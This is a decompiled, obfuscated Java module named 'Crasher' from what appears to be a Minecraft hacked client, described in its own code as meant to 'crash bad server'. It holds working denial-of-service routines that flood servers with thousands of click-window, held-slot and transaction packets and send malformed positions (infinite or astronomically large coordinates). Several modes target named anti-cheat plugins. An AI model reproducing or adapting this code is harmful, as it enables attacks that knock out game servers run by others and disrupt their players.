

/*
 * Decompiled with CFR 0.150.
 *
 * Could not load the following classes:
 *  net.minecraft.inventory.ClickType
 *  net.minecraft.item.ItemStack
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketClickWindow
 *  net.minecraft.network.play.client.CPacketConfirmTransaction
 *  net.minecraft.network.play.client.CPacketHeldItemChange
 *  net.minecraft.network.play.client.CPacketPlayer$Position
 *  net.minecraft.util.EnumHand
 *  org.apache.commons.lang3.RandomUtils
 */
package me.snow.aclient.core.setting.superblaubeere27obfuscator;

import me.snow.aclient.core.setting.Setting;
import me.snow.aclient.core.setting.superblaubeere27obfuscator.AliceMain;
import me.snow.aclient.core.setting.superblaubeere27obfuscator.Module;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketConfirmTransaction;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.util.EnumHand;
import org.apache.commons.lang3.RandomUtils;

public class Crasher
        extends Module {
    private final Setting<Boolean> Field4292 = this.Method2150366(new Setting<Boolean>("Disable", true));
    private final Setting<IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll> Field4293 = this.Method2150366(new Setting<IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll>("Mode", IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.NONE));
    private final Setting<Integer> Field4294 = this.Method2150366(new Setting<Integer>("EnableTicks", Integer.valueOf(350), Integer.valueOf(1), Integer.valueOf(2000), this::Method2161850));

    public Crasher() {
        super("Crasher", "crash bad server:).", Module.IIllIllIIllIlIIlIlIIlllIllIIllIIllIlIIllIIIllIIIllIIllIIIlIllIIlIIlllIllIIlIllIllIIlIIlIlIIIlIllIIllIlllIllIIIllIIlIIlllIllIIlIIIlIIllIIllIIlIlIIlIllIIlllIlIIlllIIlIlIIlIIlIlllIIlIIIlIIllIllIlllIIlllIIIlIIllIIIlll.MISC, true, false, false);
    }

    @Override
    public void Method2150378() {
        if (this.Field4292.getValue().booleanValue() && AliceMain.Field756.Method2150180(Crasher.class).Method2150364()) {
            this.Method2150380();
        }
    }

    @Override
    public void Method2150377() {
        if (this.Field4292.getValue().booleanValue() && AliceMain.Field756.Method2150180(Crasher.class).Method2150364()) {
            this.Method2150380();
        }
    }

    @Override
    public void Method2150376() {
        CPacketClickWindow cPacketClickWindow;
        ItemStack itemStack;
        int n2;
        if (Crasher.Method2150359()) {
            return;
        }
        for (n2 = 0; n2 < 1000; ++n2) {
            if (this.Field4293.getValue() != IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.MADCAT)
                continue;
            itemStack = new ItemStack(Crasher.Field2811.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
            cPacketClickWindow = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, itemStack, 1);
            Crasher.Field2811.player.connection.sendPacket((Packet) cPacketClickWindow);
        }
        try {
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.AAC5)) {
                Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(1.7E301, -999.0, 0.0, true));
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.ClickPacket)) {
                for (n2 = 0; n2 < this.Field4294.getValue(); ++n2) {
                    itemStack = new ItemStack(Crasher.Field2811.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                    cPacketClickWindow = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, itemStack, 1);
                    Crasher.Field2811.player.connection.sendPacket((Packet) cPacketClickWindow);
                }
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.OldNCP)) {
                Crasher.Field2811.timer.tickLength = 0.45f;
                Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(RandomUtils.nextDouble((double) -1048576.0, (double) 1048576.0), RandomUtils.nextDouble((double) -1048576.0, (double) 1048576.0), RandomUtils.nextDouble((double) -1048576.0, (double) 1048576.0), true));
                Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(RandomUtils.nextDouble((double) -65536.0, (double) 65536.0), RandomUtils.nextDouble((double) -65536.0, (double) 65536.0), RandomUtils.nextDouble((double) -65536.0, (double) 65536.0), true));
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.HeldSlot)) {
                for (n2 = 0; n2 < this.Field4294.getValue(); ++n2) {
                    itemStack = new CPacketHeldItemChange(n2);
                    Crasher.Field2811.player.connection.sendPacket((Packet) itemStack);
                }
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.Transc)) {
                for (n2 = 0; n2 < this.Field4294.getValue(); ++n2) {
                    itemStack = new CPacketConfirmTransaction(n2, 1, true);
                    Crasher.Field2811.player.connection.sendPacket((Packet) itemStack);
                }
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }

    @Override
    public void Method2150373() {
        if (Crasher.Method2150359()) {
            return;
        }
        if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.OldNCP)) {
            Crasher.Field2811.timer.tickLength = 50.0f;
        }
    }

    @Override
    public void Method2150372() {
        if (Crasher.Method2150359()) {
            return;
        }
        try {
            int n2;
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.AACNew)) {
                for (n2 = 0; n2 < 9999; ++n2) {
                    Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(Crasher.Field2811.player.posX + (double) (9412 * n2), Crasher.Field2811.player.getEntityBoundingBox().minY + (double) (9412 * n2), Crasher.Field2811.player.posZ + (double) (9412 * n2), true));
                }
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.AACOther)) {
                for (n2 = 0; n2 < 9999; ++n2) {
                    Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(Crasher.Field2811.player.posX + (double) (500000 * n2), Crasher.Field2811.player.getEntityBoundingBox().minY + (double) (500000 * n2), Crasher.Field2811.player.posZ + (double) (500000 * n2), true));
                }
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.AACOld)) {
                Crasher.Field2811.player.connection.sendPacket((Packet) new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            }
            if (this.Field4293.getValue().equals((Object) IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.OldNCP)) {
                Crasher.Field2811.timer.tickLength = 50.0f;
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }

    private boolean Method2161850(Integer n2) {
        return this.Field4293.getValue() == IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.ClickPacket || this.Field4293.getValue() == IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.HeldSlot || this.Field4293.getValue() == IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll.Transc;
    }

    public static enum IIllIIlIllIIlIlllIIllIIIllIIIllIlIIlIIIllIIlllIIllIllIlIIlllIIlllIlIlIIlllIIlllIIIllIIllIIlIIIllIIIlllIIIllIllIIIlllIIllIllIlllIIIllIIIllIIlIlIIllIIlIIIlllIIllIIllIllIlllIIIlIIlIIIlIIllIlIIllIlllIlIIIllIIIlIIIllIIIlIlIllIIllIlIll {
        NONE,
        MADCAT,
        AACOther,
        AACOld,
        AACNew,
        AAC5,
        OldNCP,
        ClickPacket,
        HeldSlot,
        Transc;

    }
}

